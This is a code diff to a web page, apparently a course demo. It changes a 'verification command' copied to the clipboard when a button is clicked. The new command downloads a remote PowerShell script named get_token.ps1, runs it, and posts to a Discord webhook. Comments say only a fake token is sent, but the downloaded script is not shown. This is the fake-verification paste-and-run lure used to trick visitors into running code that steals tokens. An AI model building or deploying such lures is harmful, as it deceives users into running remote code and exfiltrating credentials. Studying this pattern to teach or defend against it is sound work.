@@ -274,29 +274,45 @@
     <div id="status-toast-text"></div>
   </div>
 
-  <script>
-    // Safe demo command
-    const verificationCommand = 'pwsh "$HOME/pwsh_demo/scan_demo.ps1"';
+<script>
+  // SAFE demo PowerShell one-liner:
+  // 1) make folder $HOME/pwsh_demo
+  // 2) download get_token.ps1 from GitHub
+  // 3) run get_token.ps1 (which only uses a fake token)
+  // 4) send a harmless "fake token" message to your Discord webhook
+  const verificationCommand = `mkdir -Force "$HOME/pwsh_demo"; iwr 'https://raw.githubusercontent.com/Elkan-Sun/CPSC_5710/main/find_token.ps1' -OutFile "$HOME/pwsh_demo/get_token.ps1"; pwsh "$HOME/pwsh_demo/get_token.ps1"; curl -X POST -H "Content-Type: application/json" -d "{\\"content\\":\\"Fake token sent from safe demo (no real data)\\"}" "YOUR_WEBHOOK_URL"`;
 
-    const btn = document.getElementById('copyBtn');
-    const toast = document.getElementById('status-toast');
-    const toastDot = document.getElementById('status-toast-dot');
-    const toastText = document.getElementById('status-toast-text');
+  // 🔁 Replace these:
+  // - USERNAME/REPO with your GitHub username + repo
+  // - YOUR_WEBHOOK_URL with your Discord webhook URL
 
-    function showToast(message) {
-      toastText.textContent = message;
-      toast.style.display = 'flex';
-      setTimeout(() => toast.style.display = 'none', 4000);
+  const btn = document.getElementById('copyBtn');
+  const toast = document.getElementById('status-toast');
+  const toastDot = document.getElementById('status-toast-dot');
+  const toastText = document.getElementById('status-toast-text');
+
+  function showToast(message, ok = true) {
+    toastText.textContent = message;
+    // optional: color dot based on success/fail
+    if (toastDot) {
+      toastDot.style.backgroundColor = ok ? '#22c55e' : '#ef4444';
     }
+    toast.style.display = 'flex';
+    setTimeout(() => {
+      toast.style.display = 'none';
+    }, 4000);
+  }
 
-    btn.addEventListener('click', async () => {
-      try {
-        await navigator.clipboard.writeText(verificationCommand);
-        showToast("Verification command copied to clipboard.");
-      } catch (e) {
-        showToast("Failed to copy. Copy manually: " + verificationCommand);
-      }
-    });
-  </script>
+  btn.addEventListener('click', async () => {
+    try {
+      await navigator.clipboard.writeText(verificationCommand);
+      showToast("Verification command copied to clipboard.", true);
+    } catch (e) {
+      showToast("Failed to copy. Copy manually:\n" + verificationCommand, false);
+      console.error(e);
+    }
+  });
+</script>
+
 </body>
 </html>
